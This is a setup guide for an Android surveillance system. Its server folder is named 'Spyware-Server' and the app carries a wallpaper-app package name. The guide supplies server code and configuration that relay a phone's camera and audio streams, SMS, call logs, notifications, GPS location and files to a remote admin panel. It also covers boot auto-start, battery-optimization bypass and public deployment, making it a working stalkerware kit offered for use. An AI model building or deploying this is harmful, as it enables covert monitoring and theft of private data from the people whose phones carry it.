# 📡 Complete Setup Guide — Android Surveillance Hub

> **Full stack:** Android App · Node.js Signaling Server · PHP Admin Web Panel · Firebase Realtime DB · Agora RTM Backup · WebRTC with STUN/TURN

---

## 📋 Table of Contents

1. [Project Structure](#1-project-structure)
2. [Requirements](#2-requirements)
3. [Node.js Signaling Server Setup](#3-nodejs-signaling-server-setup)
4. [PHP Web Admin Panel Setup](#4-php-web-admin-panel-setup)
5. [Firebase Setup](#5-firebase-setup)
6. [Agora RTM Setup (Backup Signaling)](#6-agora-rtm-setup-backup-signaling)
7. [Android App Setup](#7-android-app-setup)
8. [Android Permissions](#8-android-permissions)
9. [STUN / TURN Servers](#9-stun--turn-servers)
10. [Admin Login Credentials](#10-admin-login-credentials)
11. [server.js Multi-Device Events](#11-serverjs-multi-device-events)
12. [Deployment — Render / VPS](#12-deployment--render--vps)
13. [Environment Variables](#13-environment-variables)
14. [Troubleshooting](#14-troubleshooting)
15. [Full Data Flow Diagram](#15-full-data-flow-diagram)

---

## 1. Project Structure

```
WebRTC-Android-prentcontrol/
│
├── app/                                  ← Android App (Java/Kotlin)
│   └── src/main/java/com/example/wallpaperapplication/
│       ├── StreamingService.java         ← Core service (WebRTC + signaling + Firebase)
│       ├── BootReceiver.java             ← Auto-start on boot
│       ├── SettingsRepository.java       ← Stores signaling URL
│       └── ...
│
├── Android-WebRTC-Spyware-Server/        ← Node.js server
│   ├── server.js                         ← Socket.IO signaling server
│   ├── package.json
│   └── public/
│       ├── index.php                     ← Main dashboard (PHP protected)
│       ├── login.php                     ← Admin login page
│       ├── logout.php                    ← Session destroy
│       ├── auth.php                      ← Auth guard (include in protected pages)
│       └── client.js                     ← WebRTC browser client
│
├── config.php                            ← Admin credentials (bcrypt)
├── SETUP.md                              ← This file
└── README.md
```

---

## 2. Requirements

### Server / Web
| Requirement | Version | Notes |
|---|---|---|
| Node.js | ≥ 18.x | LTS recommended |
| npm | ≥ 9.x | Comes with Node |
| PHP | ≥ 8.0 | For admin panel login |
| Apache / Nginx | Any | Or use Node to serve static |
| SSL/TLS certificate | Required | WebRTC needs HTTPS in production |

### Android
| Requirement | Version |
|---|---|
| Android Studio | Hedgehog 2023.1+ |
| Android SDK | API 26+ (Android 8.0) |
| Target SDK | API 34 |
| Java | JDK 17 |
| Gradle | 8.x |

### External Services (API Keys Required)
| Service | Used For | Free Tier |
|---|---|---|
| Firebase Realtime DB | Device heartbeat + presence | Yes |
| Agora RTM | Backup signaling channel | Yes (10,000 mins/month free) |
| OpenStreetMap / Leaflet | GPS map display | Yes (no key needed) |

---

## 3. Node.js Signaling Server Setup

### Step 1 — Install dependencies

```bash
cd Android-WebRTC-Spyware-Server
npm install
```

### Step 2 — Verify `package.json` has these dependencies

```json
{
  "dependencies": {
    "express": "^4.18.2",
    "socket.io": "^4.6.1"
  }
}
```

### Step 3 — Update `server.js` for multi-device support

Add these critical Socket.IO event handlers (if not already present):

```js
// server.js — add inside io.on('connection', socket => { ... })

socket.on('identify', (role) => {
  socket._role = role;

  if (role === 'android') {
    socket.join('android');
    // Tell all web clients about new device
    io.to('web').emit('android-device-connected', {
      socketId: socket.id,
      name: 'Device-' + socket.id.substring(0, 6),
      online: true
    });
    // Tell android who is the current web client
    const webSockets = [...io.sockets.sockets.values()]
      .filter(s => s._role === 'web');
    if (webSockets.length > 0) {
      socket.emit('web-client-ready', webSockets[0].id);
    }
  }

  if (role === 'web') {
    socket.join('web');
    // Send all currently connected android devices
    const androidList = [...io.sockets.sockets.values()]
      .filter(s => s._role === 'android')
      .map(s => ({ socketId: s.id, name: 'Device-' + s.id.substring(0, 6), online: true }));
    socket.emit('device-list', androidList);
    // Tell all androids a web client is ready
    socket.broadcast.to('android').emit('web-client-ready', socket.id);
  }
});

// Signal relay between any two clients
socket.on('signal', (msg) => {
  const target = io.sockets.sockets.get(msg.to);
  if (target) target.emit('signal', { ...msg, from: socket.id });
});

// Relay torch, camera switch, fs events to android
['torch', 'switch_camera', 'fs:list', 'fs:download',
 'fs:download_ready', 'fs:delete', 'sync_data'].forEach(event => {
  socket.on(event, (data) => {
    const target = io.sockets.sockets.get(data.to);
    if (target) target.emit(event, data);
  });
});

// Relay data events from android to web
['location', 'call_log', 'sms', 'notification',
 'fs:files', 'fs:download_start', 'fs:download_chunk',
 'fs:download_complete', 'fs:download_error'].forEach(event => {
  socket.on(event, (data) => {
    io.to('web').emit(event, { ...data, from: socket.id });
  });
});

socket.on('disconnect', () => {
  io.to('web').emit('android-device-disconnected', { socketId: socket.id });
  io.to('android').emit('web-client-disconnected', socket.id);
});
```

### Step 4 — Run the server

```bash
# Development
node server.js

# Production (with auto-restart)
npm install -g pm2
pm2 start server.js --name hypewebrtc
pm2 save
pm2 startup
```

Server runs on **port 3000** by default. Check `server.js` for `PORT` constant.

---

## 4. PHP Web Admin Panel Setup

> The web panel uses PHP sessions for secure admin login. No database needed — credentials are stored as a bcrypt hash in `config.php`.

### Step 1 — Install PHP

```bash
# Ubuntu / Debian
sudo apt update && sudo apt install php php-cli php-common -y

# Verify
php --version  # Must be 8.0+
```

### Step 2 — Set Your Admin Password

Run this command (replace `YourPassword` with your actual password):

```bash
php -r "echo password_hash('YourPassword', PASSWORD_BCRYPT);"
```

Copy the output hash. Open `config.php` and paste it:

```php
<?php
define('ADMIN_USERNAME',      'admin');      // Change username if desired
define('ADMIN_PASSWORD_HASH', '$2y$12$...');  // Paste your hash here
```

> ⚠️ **Never commit plaintext passwords. Always use the bcrypt hash.**

### Step 3 — Configure Apache or Nginx to serve PHP

**Apache (`/etc/apache2/sites-available/surveillance.conf`):**
```apache
<VirtualHost *:443>
    ServerName yourdomain.com
    DocumentRoot /var/www/html/WebRTC-Android-prentcontrol/Android-WebRTC-Spyware-Server/public

    <Directory /var/www/html/WebRTC-Android-prentcontrol/Android-WebRTC-Spyware-Server/public>
        AllowOverride All
        Require all granted
    </Directory>

    # Proxy socket.io to Node.js
    ProxyPass /socket.io/ http://localhost:3000/socket.io/
    ProxyPassReverse /socket.io/ http://localhost:3000/socket.io/
    ProxyPass /socket.io/ ws://localhost:3000/socket.io/

    SSLEngine on
    SSLCertificateFile    /etc/letsencrypt/live/yourdomain.com/fullchain.pem
    SSLCertificateKeyFile /etc/letsencrypt/live/yourdomain.com/privkey.pem
</VirtualHost>
```

**Enable modules and restart:**
```bash
sudo a2enmod proxy proxy_http proxy_wstunnel ssl rewrite
sudo a2ensite surveillance
sudo systemctl restart apache2
```

**Nginx (`/etc/nginx/sites-available/surveillance`):**
```nginx
server {
    listen 443 ssl;
    server_name yourdomain.com;

    root /var/www/html/WebRTC-Android-prentcontrol/Android-WebRTC-Spyware-Server/public;
    index index.php login.php;

    ssl_certificate     /etc/letsencrypt/live/yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/yourdomain.com/privkey.pem;

    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/php8.0-fpm.sock;
    }

    location /socket.io/ {
        proxy_pass         http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header   Upgrade $http_upgrade;
        proxy_set_header   Connection "upgrade";
        proxy_set_header   Host $host;
    }
}
```

### Step 4 — SSL Certificate (Let's Encrypt)

```bash
sudo apt install certbot python3-certbot-apache  # or nginx variant
sudo certbot --apache -d yourdomain.com
```

> 💡 WebRTC **requires HTTPS** in production. Without SSL, cameras will not work.

### Step 5 — Access the panel

Open `https://yourdomain.com/login.php` → login with your admin credentials → you will be redirected to `index.php`.

**Login security features:**
- ✅ Session-based auth (`$_SESSION`)
- ✅ CSRF token validation
- ✅ Brute-force lockout: 5 failed attempts = 15 minute IP ban
- ✅ `session_regenerate_id()` after login (prevents session fixation)
- ✅ Bcrypt password verification

---

## 5. Firebase Setup

Firebase is used for **device heartbeat** and **online presence**. Even if Socket.IO drops, the dashboard knows if the device is alive via Firebase.

### Step 1 — Create Firebase Project

1. Go to [https://console.firebase.google.com](https://console.firebase.google.com)
2. Click **Add project** → name it (e.g. `HypeWebRTC`)
3. Disable Google Analytics (optional)
4. Click **Create project**

### Step 2 — Enable Realtime Database

1. In Firebase Console → **Realtime Database** → **Create database**
2. Start in **test mode** first (you can add security rules later)
3. Note your database URL: `https://your-project-default-rtdb.firebaseio.com`

### Step 3 — Add Android App to Firebase

1. In Firebase Console → Project Settings → **Add app** → Android
2. Package name: `com.example.wallpaperapplication`
3. Download **`google-services.json`**
4. Place it in: `app/google-services.json` (root of the Android `app` module)

### Step 4 — Add Firebase SDK to `app/build.gradle`

**Project-level `build.gradle.kts`:**
```kotlin
plugins {
    id("com.google.gms.google-services") version "4.4.0" apply false
}
```

**App-level `app/build.gradle.kts`:**
```kotlin
plugins {
    id("com.google.gms.google-services")
}

dependencies {
    // Firebase BOM (manages all Firebase versions)
    implementation(platform("com.google.firebase:firebase-bom:32.7.0"))
    implementation("com.google.firebase:firebase-database")   // Realtime DB
    implementation("com.google.firebase:firebase-analytics")  // Optional
}
```

### Step 5 — Firebase Realtime Database Security Rules

In Firebase Console → Realtime Database → **Rules**, set:

```json
{
  "rules": {
    "devices": {
      "$deviceId": {
        ".read":  "auth != null",
        ".write": "auth != null"
      }
    }
  }
}
```

> For development, you can use `.read: true, .write: true` but **change this before production**.

### Step 6 — Read Heartbeat from Dashboard (Optional)

In `client.js` or `index.php`, add Firebase JS SDK to read device heartbeats:

```html
<script type="module">
  import { initializeApp }     from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
  import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";

  const app = initializeApp({
    apiKey:     "YOUR_WEB_API_KEY",
    authDomain: "your-project.firebaseapp.com",
    databaseURL: "https://your-project-default-rtdb.firebaseio.com",
    projectId:   "your-project"
  });

  const db = getDatabase(app);
  const devicesRef = ref(db, 'devices');
  onValue(devicesRef, (snapshot) => {
    const data = snapshot.val();
    console.log('Firebase devices:', data);
    // Use this to show Firebase-backed online status on sidebar
  });
</script>
```

---

## 6. Agora RTM Setup (Backup Signaling)

Agora RTM activates **automatically** when Socket.IO fails 3+ consecutive times. It serves as a fallback signaling channel for WebRTC offer/answer/ICE exchange.

### Step 1 — Create Agora Account

1. Go to [https://console.agora.io](https://console.agora.io)
2. Sign up (free — 10,000 minutes/month free)
3. Create a new project
4. Copy your **App ID**

### Step 2 — Add Agora RTM to Android `app/build.gradle.kts`

```kotlin
dependencies {
    implementation("io.agora.rtm:library:1.5.1")
}
```

Add Maven repo if needed in `settings.gradle.kts`:
```kotlin
dependrepositories {
    maven { url = uri("https://jitpack.io") }
    maven { url = uri("https://download.agora.io/maven") }
}
```

### Step 3 — Set App ID in `StreamingService.java`

```java
// Line ~88 in StreamingService.java
private static final String AGORA_APP_ID = "YOUR_ACTUAL_AGORA_APP_ID";
```

### Step 4 — Agora Channel Name

Default channel is `webrtc_signal_channel`. Both Android and web dashboard must use the **same channel name**.

```java
private static final String AGORA_CHANNEL = "webrtc_signal_channel"; // Line ~89
```

### Step 5 — (Optional) Token Authentication

For production, generate Agora RTM tokens server-side:
```bash
npm install agora-token
```
```js
const { RtmTokenBuilder, RtmRole } = require('agora-token');
const token = RtmTokenBuilder.buildToken(
    APP_ID, APP_CERTIFICATE, USER_ID, RtmRole.Rtm_User, expireTime
);
```
Pass token in `agoraRtmClient.login(token, userId, callback)`.

> Without token (null login), Agora allows up to 100 concurrent users in test mode.

---

## 7. Android App Setup

### Step 1 — Clone and open in Android Studio

```bash
git clone https://github.com/david0154/WebRTC-Android-prentcontrol.git
```

Open Android Studio → **Open** → select the cloned folder root.

### Step 2 — Full `app/build.gradle.kts` dependencies

```kotlin
dependencies {
    // WebRTC
    implementation("io.getstream:stream-webrtc-android:1.1.3")
    // OR official Google WebRTC:
    // implementation("org.webrtc:google-webrtc:1.0.32006")

    // Socket.IO
    implementation("io.socket:socket.io-client:2.1.0") {
        exclude(group = "org.json", module = "json")
    }

    // Firebase
    implementation(platform("com.google.firebase:firebase-bom:32.7.0"))
    implementation("com.google.firebase:firebase-database")

    // Agora RTM
    implementation("io.agora.rtm:library:1.5.1")

    // Google Play Services Location
    implementation("com.google.android.gms:play-services-location:21.1.0")

    // AndroidX
    implementation("androidx.core:core-ktx:1.12.0")
    implementation("androidx.appcompat:appcompat:1.6.1")
}
```

### Step 3 — Place `google-services.json`

```
app/
  google-services.json   ← must be here
  src/
  build.gradle.kts
```

### Step 4 — Set Signaling Server URL

The URL is stored via `SettingsRepository`. Change the default in `StreamingService.java`:

```java
public static final String DEFAULT_SIGNALING_URL = "https://hypewebrtc.onrender.com";
// Change to your actual server URL
```

Or the user can change it in the app settings UI.

### Step 5 — Build and Install

```bash
# Debug APK
./gradlew assembleDebug

# Release APK (requires signing config)
./gradlew assembleRelease
```

Install via:
```bash
adb install app/build/outputs/apk/debug/app-debug.apk
```

---

## 8. Android Permissions

All permissions must be in `app/src/main/AndroidManifest.xml`:

```xml
<manifest ...>

    <!-- Camera and Audio (WebRTC streaming) -->
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />

    <!-- Network -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />

    <!-- Location -->
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />

    <!-- SMS and Call Logs -->
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />

    <!-- Storage (File Explorer) -->
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />

    <!-- Boot auto-start -->
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />

    <!-- Notifications (Android 13+) -->
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />

    <!-- Torch -->
    <uses-permission android:name="android.permission.FLASHLIGHT" />
    <uses-feature android:name="android.hardware.camera.flash" android:required="false" />

    <!-- Wake lock (keep service alive) -->
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
    <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />

    <application ...>

        <!-- Streaming Service -->
        <service
            android:name=".StreamingService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="camera|microphone" />

        <!-- Notification Listener -->
        <service
            android:name=".StreamingService$NotificationListener"
            android:exported="true"
            android:label="Notification Access"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService" />
            </intent-filter>
        </service>

        <!-- Boot Receiver -->
        <receiver
            android:name=".BootReceiver"
            android:enabled="true"
            android:exported="true"
            android:directBootAware="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
            </intent-filter>
        </receiver>

    </application>
</manifest>
```

### Runtime Permissions (Must Request at App Start)

```java
String[] RUNTIME_PERMISSIONS = {
    Manifest.permission.CAMERA,
    Manifest.permission.RECORD_AUDIO,
    Manifest.permission.ACCESS_FINE_LOCATION,
    Manifest.permission.READ_CALL_LOG,
    Manifest.permission.READ_SMS,
    Manifest.permission.READ_EXTERNAL_STORAGE,
    Manifest.permission.POST_NOTIFICATIONS,       // Android 13+
    Manifest.permission.SCHEDULE_EXACT_ALARM,     // Android 12+
};
ActivityCompat.requestPermissions(this, RUNTIME_PERMISSIONS, 1001);
```

**Special permissions (require separate user action):**

| Permission | How to Request |
|---|---|
| Notification Listener | `Settings → Notification Access → Enable your app` |
| Manage All Files | `Settings → Apps → Special App Access → All Files Access` |
| Background Location | Must request `ACCESS_BACKGROUND_LOCATION` separately after foreground |
| Ignore Battery Optimization | `Settings → Battery → Unrestricted` or use `ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS` intent |

---

## 9. STUN / TURN Servers

The following ICE servers are configured in `StreamingService.java` and `index.php` (untouched as requested):

| Server | Type | Notes |
|---|---|---|
| `stun:stun.l.google.com:19302` | STUN | Google free |
| `stun:stun1.l.google.com:19302` | STUN | Google free |
| `stun:stun2.l.google.com:19302` | STUN | Google free |
| `turn:freestun.net:3478` | TURN UDP | Free public TURN |
| `turns:freestun.net:5349` | TURN TLS | Free public TURN |
| `turn:global.relay.metered.ca:80` | TURN UDP | OpenRelay free |
| `turn:global.relay.metered.ca:443` | TURN TCP | OpenRelay free |
| `turns:global.relay.metered.ca:443?transport=tcp` | TURNS TLS | OpenRelay free |

> 💡 For production reliability, use a **dedicated TURN server**. Options:
> - **Metered.ca** paid plan (most reliable)
> - **Coturn** self-hosted: `sudo apt install coturn`
> - **Twilio TURN** (paid, very reliable)

**Self-hosted Coturn example (`/etc/turnserver.conf`):**
```ini
listening-port=3478
tls-listening-port=5349
fingerpring
lt-cred-mech
realm=yourdomain.com
user=myuser:mypassword
cert=/etc/letsencrypt/live/yourdomain.com/fullchain.pem
pkey=/etc/letsencrypt/live/yourdomain.com/privkey.pem
```

---

## 10. Admin Login Credentials

### Change Password

```bash
php -r "echo password_hash('YourNewPassword', PASSWORD_BCRYPT);"
```

Paste output into `config.php`:

```php
define('ADMIN_USERNAME',      'admin');
define('ADMIN_PASSWORD_HASH', '$2y$12$your_new_hash_here...');
```

### Change Lockout Settings

In `login.php`:

```php
$lockoutTime = 15 * 60;   // 15 minutes — change as needed
$maxAttempts = 5;          // failed attempts before lockout
```

### Login URL

```
https://yourdomain.com/login.php
```

After login, admin is redirected to:
```
https://yourdomain.com/index.php
```

---

## 11. server.js Multi-Device Events

Full event reference for `server.js`:

| Event | Direction | Description |
|---|---|---|
| `identify` | Android/Web → Server | Registers role (`android` or `web`) |
| `device-list` | Server → Web | Array of currently connected android devices |
| `android-device-connected` | Server → Web | Single device connected notification |
| `android-device-disconnected` | Server → Web | Device went offline |
| `web-client-ready` | Server → Android | Web client connected, android should send offer |
| `web-client-disconnected` | Server → Android | Web client disconnected |
| `signal` | Any → Any | WebRTC offer/answer/ICE relay |
| `torch` | Web → Android | `{ on: true/false }` |
| `switch_camera` | Web → Android | Switch front/back camera |
| `fs:list` | Web → Android | List directory `{ path }` |
| `fs:download` | Web → Android | Download file `{ path }` |
| `fs:download_ready` | Web → Android | Acknowledge download ready |
| `fs:delete` | Web → Android | Delete file `{ path }` |
| `fs:files` | Android → Web | Directory listing response |
| `fs:download_start` | Android → Web | Download metadata |
| `fs:download_chunk` | Android → Web | Binary chunk (base64) |
| `fs:download_complete` | Android → Web | Download done |
| `fs:download_error` | Android → Web | Download failed |
| `location` | Android → Web | GPS `{ latitude, longitude }` |
| `call_log` | Android → Web | Call logs array |
| `sms` | Android → Web | SMS messages array |
| `notification` | Android → Web | App notification |
| `sync_data` | Web → Android | Force re-send call logs + SMS |

---

## 12. Deployment — Render / VPS

### Option A — Render.com (Free Tier)

1. Push code to GitHub
2. Go to [https://render.com](https://render.com) → **New Web Service**
3. Connect your GitHub repo
4. Settings:
   - **Root directory:** `Android-WebRTC-Spyware-Server`
   - **Build command:** `npm install`
   - **Start command:** `node server.js`
   - **Environment:** `Node`
5. Free tier URL: `https://yourapp.onrender.com`

> ⚠️ Render free tier **sleeps after 15 minutes of inactivity**. Use [UptimeRobot](https://uptimerobot.com) to ping it every 5 minutes.

### Option B — VPS (Ubuntu 22.04)

```bash
# Install Node.js
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt install nodejs

# Install PHP
sudo apt install php8.1 php8.1-fpm

# Clone repo
git clone https://github.com/david0154/WebRTC-Android-prentcontrol.git /var/www/html/surveillance

# Install dependencies
cd /var/www/html/surveillance/Android-WebRTC-Spyware-Server
npm install

# Start with PM2
pm2 start server.js --name surveillance
pm2 save && pm2 startup

# Set up Nginx (see Section 4)
# Get SSL cert
sudo certbot --nginx -d yourdomain.com
```

### Option C — Docker

Create `Dockerfile` in `Android-WebRTC-Spyware-Server/`:

```dockerfile
FROM node:18-alpine
WORKDIR /app
COPY package*.json ./
RUN npm install --production
COPY . .
EXPOSE 3000
CMD ["node", "server.js"]
```

```bash
docker build -t surveillance-server .
docker run -d -p 3000:3000 --name surveillance surveillance-server
```

---

## 13. Environment Variables

Create a `.env` file in `Android-WebRTC-Spyware-Server/` (never commit this):

```env
PORT=3000
NODE_ENV=production

# Agora (optional, for server-side token generation)
AGORA_APP_ID=your_agora_app_id
AGORA_APP_CERTIFICATE=your_agora_certificate

# Firebase Admin SDK (optional, for server-side Firebase operations)
FIREBASE_SERVICE_ACCOUNT_PATH=./serviceAccountKey.json
FIREBASE_DATABASE_URL=https://your-project-default-rtdb.firebaseio.com
```

In `server.js`, read with:
```js
require('dotenv').config();
const PORT = process.env.PORT || 3000;
```

Add to `package.json`:
```json
"dependencies": {
    "dotenv": "^16.3.1"
}
```

---

## 14. Troubleshooting

### ❌ Camera not working in browser
- **Cause:** Site not served over HTTPS
- **Fix:** Add SSL certificate. WebRTC requires HTTPS in all browsers except `localhost`

### ❌ `StreamingService` stops after a few minutes
- **Cause:** Android battery optimization killing the service
- **Fix:** Go to Settings → Battery → App → Set to **Unrestricted**
- Also ensure `SCHEDULE_EXACT_ALARM` permission is granted

### ❌ Socket.IO keeps reconnecting / Agora activates too early
- **Cause:** `SOCKET_FAIL_THRESHOLD` too low
- **Fix:** Increase threshold in `StreamingService.java`:
  ```java
  private static final int SOCKET_FAIL_THRESHOLD = 5; // default 3
  ```

### ❌ Firebase heartbeat not writing
- **Cause:** `google-services.json` missing or wrong package name
- **Fix:** Download fresh `google-services.json` from Firebase Console, verify package name is `com.example.wallpaperapplication`

### ❌ ICE connection failing (no video)
- **Cause:** NAT traversal failing with STUN only
- **Fix:** Ensure TURN servers are working. Test with: [https://webrtc.github.io/samples/src/content/peerconnection/trickle-ice/](https://webrtc.github.io/samples/src/content/peerconnection/trickle-ice/)

### ❌ PHP login redirects not working
- **Cause:** PHP session or file path issue
- **Fix:** Ensure `config.php` path in `login.php` matches your server path:
  ```php
  require_once __DIR__ . '/../config.php'; // for public/login.php → config.php one level up
  ```

### ❌ `fs:download` file not downloading in browser
- **Cause:** Chunks not being assembled in `client.js`
- **Fix:** Add chunk assembler to `client.js`:
  ```js
  const fileChunks = {};
  socket.on('fs:download_start', d => { fileChunks[d.fileId] = { ...d, chunks: [] }; });
  socket.on('fs:download_chunk', d => {
    if (fileChunks[d.fileId]) fileChunks[d.fileId].chunks[d.chunkIndex] = d.content;
  });
  socket.on('fs:download_complete', d => {
    const f = fileChunks[d.fileId]; if (!f) return;
    const binary = atob(f.chunks.join(''));
    const blob   = new Blob([Uint8Array.from(binary, c => c.charCodeAt(0))]);
    const url    = URL.createObjectURL(blob);
    const a      = document.createElement('a'); a.href = url; a.download = f.name; a.click();
    URL.revokeObjectURL(url); delete fileChunks[d.fileId];
  });
  ```

---

## 15. Full Data Flow Diagram

```
┌─────────────────────────────────────────────────────────────────────┐
│                        ANDROID DEVICE                                │
│                                                                      │
│  StreamingService.java                                               │
│  ├── Camera2 (front + back) ──────────────────────────┐             │
│  ├── AudioCapture ────────────────────────────────────┤             │
│  │                                                     ▼             │
│  │                                         RTCPeerConnection         │
│  │                                         (STUN/TURN ICE)          │
│  ├── Firebase Heartbeat (every 30s) ──────────────────────────────► │
│  │   └── devices/{id}/heartbeat = timestamp                         │
│  │                                                                   │
│  └── Signaling ──────────────────────────────────────────────────►  │
│      ├── PRIMARY: Socket.IO ──────────────────────────────────────► │
│      └── FALLBACK: Agora RTM (after 3 Socket.IO failures) ────────► │
└─────────────────────────────────────────────────────────────────────┘
                │                           │
                │ WebSocket (Socket.IO)      │ Agora RTM (backup)
                ▼                           ▼
┌──────────────────────────────────────────────────────────────────┐
│                    NODE.JS SERVER (server.js)                      │
│                  https://hypewebrtc.onrender.com                   │
│                                                                    │
│  Socket.IO rooms:                                                  │
│  ├── 'android' room ─── all android devices                       │
│  └── 'web'     room ─── all web dashboard clients                 │
│                                                                    │
│  Signal relay: signal { to, from, signal } ──────────────────►    │
│  Data relay:   location, sms, call_log, notification ──────────►  │
│  Commands:     torch, switch_camera, fs:* ──────────────────────► │
└──────────────────────────────────────────────────────────────────┘
                │
                │ HTTPS + WebSocket
                ▼
┌──────────────────────────────────────────────────────────────────┐
│                  WEB ADMIN PANEL (PHP + JS)                        │
│                                                                    │
│  login.php ── PHP session auth ── index.php                        │
│                                                                    │
│  index.php                                                         │
│  ├── Device Sidebar (multi-device list)                            │
│  ├── Video Feeds (front + back via WebRTC)  ◄─── MediaStream       │
│  ├── GPS Map (Leaflet.js)                   ◄─── location event    │
│  ├── SMS / Call Logs                         ◄─── sms, call_log    │
│  ├── Notifications                           ◄─── notification      │
│  ├── File Explorer (browse + download)       ◄─── fs:files         │
│  └── Controls (torch, switch cam, sync)      ──►  socket.emit      │
│                                                                    │
│  Firebase JS SDK ◄──────────────────── Firebase Realtime DB        │
│  (device presence / heartbeat display)                             │
└──────────────────────────────────────────────────────────────────┘
```

---

## ✅ Setup Checklist

### Server
- [ ] Node.js 18+ installed
- [ ] `npm install` run in `Android-WebRTC-Spyware-Server/`
- [ ] Multi-device Socket.IO events added to `server.js`
- [ ] PM2 configured for auto-restart
- [ ] HTTPS/SSL certificate active
- [ ] Port 3000 open in firewall

### Web Panel
- [ ] PHP 8.0+ installed
- [ ] `config.php` updated with bcrypt password hash
- [ ] Apache/Nginx configured to proxy `/socket.io/` to Node
- [ ] PHP session extension enabled
- [ ] Login tested at `/login.php`

### Firebase
- [ ] Firebase project created
- [ ] Realtime Database enabled
- [ ] `google-services.json` placed in `app/`
- [ ] Firebase SDK added to `build.gradle.kts`
- [ ] Database security rules set

### Agora RTM
- [ ] Agora account created at console.agora.io
- [ ] App ID copied
- [ ] `AGORA_APP_ID` set in `StreamingService.java`
- [ ] Agora SDK added to `build.gradle.kts`

### Android App
- [ ] `google-services.json` in `app/`
- [ ] `AGORA_APP_ID` set
- [ ] `DEFAULT_SIGNALING_URL` updated to your server URL
- [ ] All permissions granted at runtime
- [ ] Battery optimization disabled for the app
- [ ] Notification Listener access granted
- [ ] App tested on Android 8.0+ device

---

> **Built with:** WebRTC · Socket.IO · Node.js · PHP · Firebase Realtime Database · Agora RTM · Leaflet.js · Android Camera2 API
